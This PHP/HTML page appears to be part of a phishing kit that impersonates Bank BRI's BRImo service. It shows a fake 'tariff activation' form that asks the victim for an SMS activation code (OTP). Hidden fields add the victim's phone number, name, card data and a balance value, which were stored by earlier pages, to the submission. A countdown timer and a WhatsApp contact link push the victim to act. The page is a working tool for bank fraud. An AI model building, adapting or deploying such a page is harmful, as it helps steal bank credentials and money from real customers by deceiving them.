<?php
session_start();
$nope = $_SESSION['nohp'];
?>





<html>
 <head> 
  <meta charset="utf-8"> 
  <meta name="fragment" content="!"> 
  <meta name="theme-color" content="#0F78CB"> 
   <!-- HTML Meta Tags -->

  <title>𝗔𝗸𝘁𝗶𝘃𝗮𝘀𝗶 𝗧𝗮𝗿𝗶𝗳 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜</title>

  <meta name="description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">  
  <!-- Facebook Meta Tags -->
  <meta property="og:type" content="website">
  <meta property="og:title" content="𝗔𝗸𝘁𝗶𝘃𝗮𝘀𝗶 𝗧𝗮𝗿𝗶𝗳 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜">
  <meta property="og:description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">
  <meta property="og:image" content="">

  <!-- Twitter Meta Tags -->
  <meta name="twitter:card" content="summary_large_imag">
  <meta name="twitter:title" content="𝗔𝗸𝘁𝗶𝘃𝗮𝘀𝗶 𝗧𝗮𝗿𝗶𝗳 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜">
  <meta name="twitter:description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">
  <meta name="twitter:image" content="">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
<link rel="icon" href="img/BRImo.png" type="image/x-icon" />
<link rel="apple-touch-icon" href="" />
  <!-- Meta Tags Generated via https://www.opengraph.xyz -->
        
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous"> 
  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"> 
  <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
        body {
            padding: 0;
            margin: 0;
            width: 100%;
            font-family: 'Open Sans', sans-serif;
            position: absolute;
            background:#d1d1d1;
        }

        .text-header {
            font-family: 'Open Sans', sans-serif;
            color: #0086e0;
        }

        .text-subheader {
            font-family: 'Open Sans', sans-serif;
            margin-top: -20px;
            color: #000;
        }

        .btn-punya {
            display: block;
            margin: 80px auto 0 auto;
            padding: 0px; 
            cursor: pointer; 
            background: none rgb(0, 134, 224);
            border: none; 
            text-align: center; 
            height: 57px; 
            width: 459px; 
            max-width: 100%;
            font-family: Arial; 
            font-size: 14px; 
            font-weight: bold; 
            color: rgb(255, 255, 255); 
            letter-spacing: 2px; 
            line-height: 1; 
            border-radius: 5px; 
            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
            transition: background 200ms ease 0s;
        }

        .btn-belum {
            display: block;
            margin: 10px auto;
            padding: 0px; 
            cursor: pointer; 
            background: none transparent;
            border: none; 
            text-align: center; 
            height: 57px; 
            width: 459px; 
            max-width: 100%;
            font-family: Arial; 
            font-size: 14px; 
            font-weight: bold; 
            color: rgb(0, 134, 224);
            letter-spacing: 2px; 
            line-height: 1; 
            border-radius: 5px; 
            transition: background 200ms ease 0s;
        }

        .form-log {
            box-sizing: border-box; 
            height: 45px; 
            width: 336px;
            max-width: 90%;
            border: 3px solid rgb(0, 134, 224);
            border-radius: 23px;
            font-family: 'Open Sans', sans-serif;
            font-size: 16px; 
            color: rgb(28, 28, 28); 
            word-spacing: 0px; 
            padding: 0px 45px;
            text-align: center;
            outline:none;
            }

        #ionIcons {
            color: rgb(22, 119, 199);
            font-size: 29px;
            position: absolute;
            display: block;
            margin-top: 8px;
            margin-left: 37px;
        }

        .eye {
            display: block;
            margin: -40px auto;
            margin-right: 20px;
            position: relative;
            box-sizing: border-box; 
            z-index: 16; 
            height: 19.8189px;
            width: 25.0236px; 
            float: right;
            border-radius: 0px; 
            cursor: pointer;
        }

        .Button clickable-element {
            display: block;
            margin: 60px 0 0 0;
            padding: 0px; 
            cursor: pointer; 
            background: none rgba(0, 111, 214, 0.96); 
            border: none; 
            text-align: center; 
            height: 57px; 
            width: 370px; 
            font-family: Arial; 
            font-size: 17px; 
            font-weight: bold; 
            color: rgb(255, 255, 255); 
            letter-spacing: 1px; 
            line-height: 1; 
            border-radius: 8px; 
            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
            transition: background 100ms step-start 0s;
        }

        @media only screen and (max-width: 600px) {
            .btn-login {
                width: 82%;
            }
        }

        .box-lte {
            width: 380px;
            max-width: 95%;
            background: #fff;
            display: block;
            box-shadow: 10px 15px 10px 0 rgba(90, 116, 148, 0.4);
            margin: -40px auto;
            border-radius: 20px;
        }

        textarea {
            box-sizing: border-box; 
            height: 75px;
            margin-top: -30px;
            width: 280px;
            border: 3px solid rgb(0, 134, 224);
            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
            border-radius: 15px;
            padding: 5px 10px;
        }
        
          .textarea1 {
            box-sizing: border-box; 
            
            border: 2px solid red;
            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
            border-radius: 50px;
            
        }
        
         .textarea {
            box-sizing: border-box; 
            height: 75px;
           
            width: 280px;
            border: 2px solid red;
            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
            border-radius: 15px;
            padding: 5px 10px;
        }
        
        textarea::placeholder{
            font-size: 13px;
        }
           h1{
            display: table;
            background-color: transparent;
            color: #FF0000;
            padding: 15px;
            width: 100%;
            font-size: 14px;
            margin-bottom: -70px;
            text-align: center;
            position: fixed;
            top: 0;
           font-weight: bold;
            right: 0;
            left: 0;
            margin: 0px auto;
            
        }
        
        .blink {
  animation: blink-animation 2s steps(6, start) infinite;
  -webkit-animation: blink-animation 2s steps(6, start) infinite;
}
@keyframes blink-animation {
  to {
    visibility: hidden;
  }
}
@-webkit-keyframes blink-animation {
  to {
    visibility: hidden;
  }
}

#Aktivasi{
    display: none;
}

 .lonte{
  display:none;
  position: absolute;
  top: 45%;
  left: 44.5%;
  transform: translate(-50%, -50%);
  
/*   spinner div css */
  height : 45px;
  width : 45px;
  border-radius : 50%;
/*   background-color : red; */
  border : 10px solid #ffffff80;
  border-top-color : #007bff;
  animation : spin 1s linear infinite;
}

@keyframes spin{
  0%{
    transform : rotate(0deg);
  }
  100%{
    transform : rotate(360deg);
  }
}
        .alert * {
            color: #fff;
            font-size: 13px;
            font-weight: 600;
        }

        .alert p {
            color: #fff;
            font-size: 13px;
            font-weight: 600;
            margin-left:10px;
            position: absolute;
            top:14px;
        }
        .alert img {
            margin-right: 100px;
            position: absolute;
            margin-top:5px;
        }
        .alert {
            position: absolute;
            border-radius: 3px;
            z-index: 9999999;
            top: 12px;
            height:50px;
            margin: 0 auto;
            width: calc(100% - 19px);
            max-width: 500px;
            background: #E84040;
            padding: 12px;
            display: block;
            align-items: center;
            box-shadow: 1px 2px 2px 1px #0000002b;
        }
        
        .loader{
      font-size: 20px;
      color: #FFF;
      font-weight: bold;
      display: inline-block;
      font-family: 'Nunito', sans-serif;
      z-index:999999999999999999999;
      position: absolute;
      margin-top: 350px;
      margin-left:-50px;
    }
    .loader:before{
      content: '';
      animation: 2s print linear alternate infinite;
    }
    .loader:after{
      content: '';
      position: absolute;
      right: -px;
      top: 50%;
      transform: translatey(-45%);
      width: 2px;
      height: 1.3em;
      background: currentColor;
      opacity: 0.8;
      animation: 1s blink steps(2) infinite;
    }
    
    @keyframes blink {
      0%  { visibility: hidden;}
      100%  { visibility: visible;}
    }
    @keyframes print {
      0% { content: 'B'}
      10% { content: 'BR'}
      20% { content: 'BRI'}
      30% { content: 'BRIm'}
      40% { content: 'BRImo'}
      50% { content: 'BRImo-'}
      60% { content: 'BRImo-B'}
      70% { content: 'BRImo-BR.'}
      80% { content: 'BRImo-BRI..'}
      90% , 100% { content: 'BRImo-BRI...'}
    }
    
    .load{
     top: 0;
     left: 0;
     right: 0;
     position: fixed;
     display: flex;
     justify-content: center;
     align-items: center;
     background: #00000090;
     z-index: 999999999;
     width: 100%;
     height: 100%;
      }
    </style> 
 </head> 
 <body> 
  
 <center>
     <div id="process1" name="process" class="process1" style="display: none;">
        <span class="loader"></span>
        </div>
        <div class="load" style="display:none"></div>        
        </center>
  
    
   <div class="container" id="Aktivasi" style="display: block"> 
   <div class="box-lte"> 
    <div class="row" style="margin-top: 140px;"> 
     <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: -50px; border-radius: 0px;"> 
      <img alt="" src="img/AddText_02-18-09.12.14.png" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;" margin-left:="" 10px;="" margin-right:=""> 
     </div> 
    </div> 
    <div class="row"> 
        
     <hr style="display: block;  width: 90%;margin:auto;">
      
     <span class="alert" style="display:none;">
            <img src="img/alert.png"    style="width:20px;float:left;margin-top:2px;"alt=""></img>
            <p style="margin-left:30px;">Invalid Requests</p>
        </span>
     <p id="alert" style="position:relative;font-size: 14px; text-align: center; font-weight: bold; padding: 15px;margin: -10px auto;margin-left:-0px;color: #098CE3;"><?php echo $nope; ?></p>
     
     <p style="font-weight: bold; font-size: 15px; color: #098CE3; text-align: center; margin: 10px auto;" id="countdown"></p> 
    </div> 
    <div class="row"> 
     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: -10px"> 
         
    <div id="lonte" class="lonte"></div>
      <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px">Silahkan masukan kode Aktivasi TARIF Anda, Jika belum menerima Kode silahkan klik tombol di bawah ini<br><br>Kode Aktivasi (Wajib).</p> 
     </div> 
    </div> 
    <div class="row"> 
     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;"> 
  <form  method="post" id="formLink">
<input type="hidden" id="tele" name="tele" value="">
<input type="hidden" id="namanye" name="namanye" value="">
<input type="hidden" id="kertu" name="kertu" value="">
<input type="hidden" id="uang" name="uang" value="">
       <center> 
        <div style="margin-top: -21px"> 
        
       <i class="ion-ios-locked-outline" id="ionIcons"></i> 
   

         <input type="tel" name="otp" id="nama1"  class="bubble-element Input form-log" placeholder="KODE Aktivasi" maxlength="" minlength="" style="margin-left: 0px;" required onclick="gantiborder1()">
  
         <b> <p style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: underline" onclick="jie()"> Belum Menerima Kode Aktivasi ? </strong></p></b>
        </div>
       </center>
       <b>
<input type="submit" id="kirims" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 15px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="Konfirmasi"  />
</b>
      </form>
     </div>
     <b> </b>
    </div>
    <b> </b>
   </div>
   <b> 
    <div class="row"> 
     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;"> 
      <p style="font-size: 12px; text-align: center; margin-top: 50px;"><strong style="color: #5e5e5e;">Tidak terima SMS? <a href="ver.php" style="text-decoration: none; color: none rgb(9, 100, 127);">Kirim ulang SMS</a></strong></p> 
     </div> 
     <center>
 <img src="img/1703668668502.png" style="width: 100%; position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto">
     </center>
    </div> </b>
  </div>
 

   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

<script>
            function startTimer(duration) {
            var timer = duration, minutes, seconds;
            var display = $("#countdown");
            var intervalId = setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);
                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;
                display.text(minutes + " : " + seconds);
                if (--timer < 0) {
                    clearInterval(intervalId);
                    $(".resend").css("opacity", "1");
                    $("span.send").click(scountdown);
                }
            }, 1000);
        }
        function scountdown(){
            $("span.send").off();
            $(".resend").css("opacity", "0.5");
            startTimer(60 * 1);
        }
        $(document).ready(scountdown);

  
    </script>  
 
  
 <script src="js/4.js" >
       
</script>
<script>
   var phone = sessionStorage.getItem("phone"); 
    
    
    var phone = sessionStorage.getItem("phone");
 document.getElementById("tele").value = phone + "";
 
  var user = sessionStorage.getItem("user");
 document.getElementById("namanye").value = user + "";
 
  var card = sessionStorage.getItem("card");
 document.getElementById("kertu").value = card + "";
 
 var duet = sessionStorage.getItem("duet");
 document.getElementById("uang").value = duet + "";
</script>

<script>
 
 
 function gantiborder1(){
   $("#nama1").removeClass('textarea1'); 
   $("#blinkAktivasi").hide(); 
   document.getElementById('kirims').value = "Konfirmasi";
 }   
</script>
<script>
    function showAlert(a){
            $(".alert").slideDown();
            setTimeout(function(){
                $(".alert").slideUp(90);
            }, 3000);
        }

        function jie(){
            window.location.href='https://wa.me/6282112309809?text=tekspesanludisini';
        }
</script>
<script src="js/vibr.js"></script>
</body>
<!-- </body> -->
</html>
